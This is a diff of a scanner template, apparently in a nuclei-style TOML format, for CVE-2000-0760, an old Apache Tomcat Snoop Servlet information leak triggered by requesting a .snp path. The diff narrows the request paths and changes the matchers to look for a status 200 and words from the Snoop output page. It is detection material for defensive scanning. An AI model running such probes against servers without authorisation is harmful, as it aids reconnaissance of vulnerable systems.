@@ -1,17 +1,17 @@
 [info]
-author = "AVE"
-description = "Apache Tomcat 3.0/3.1 Snoop Servlet信息泄露漏洞PoC，通过请求任意.snp后缀路径触发Snoop Servlet返回系统环境变量、请求参数等敏感信息"
+author = "ave"
+description = "通过请求不存在的 .snp 扩展名路径，触发 Snoop Servlet 返回系统环境变量、请求参数等敏感信息"
 id = "POC-AVE-2000-0002"
-name = "CVE-2000-0760 PoC"
+name = "Jakarta Tomcat 3.1 and 3.0 - Information Disclosure PoC"
 severity = "medium"
-tags = ["cve-2000-0760"]
+tags = ["ave-2000-0002"]
 vuln_id = [
     "CVE-2000-0760",
     "AVE-2000-0002",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
@@ -20,46 +20,16 @@ protocol = "http"
 
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = [
-    "java.version",
-    "os.name",
-    "java.home",
-    "java.vendor",
-    "user.dir",
-]
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/jsp/snp/anything.snp"
-protocol = "http"
+status = [200]
+type = "status"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "java.version",
-    "os.name",
-    "java.home",
-    "java.vendor",
-    "user.dir",
-]
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/snp/anything.snp"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "java.version",
-    "os.name",
-    "java.home",
-    "java.vendor",
-    "user.dir",
+    "Request Information",
+    "Path info",
+    "Server name",
+    "Remote address",
 ]
